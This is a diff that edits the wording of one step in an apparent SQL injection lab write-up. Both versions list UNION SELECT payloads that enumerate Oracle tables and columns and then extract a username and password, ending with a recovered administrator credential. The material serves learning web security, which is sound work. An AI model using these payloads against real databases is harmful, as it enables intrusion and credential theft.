@@ -149,4 +149,4 @@ First, I tested with payload as **'+UNION+SELECT+*+FROM+information_schema.table
 
 Solution:
 
-Reused experience above, we have payload to list table name as **'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--**. After we have payload as **'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+all_tab_columns+WHERE+TABLE_NAME+=+'USERS_TTAZON'--** and **'+UNION+SELECT+PASSWORD_DACSDY,USERNAME_XICVMM+FROM+USERS_TTAZON--**. Finally, we get *administrator* and *vbp1uh0zrpdgrquanuih*
+Reusing the experience above, we have a payload to list table names as **'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--**. After we have payload as **'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+all_tab_columns+WHERE+TABLE_NAME+=+'USERS_TTAZON'--** and **'+UNION+SELECT+PASSWORD_DACSDY,USERNAME_XICVMM+FROM+USERS_TTAZON--**. Finally, we get *administrator* and *vbp1uh0zrpdgrquanuih*
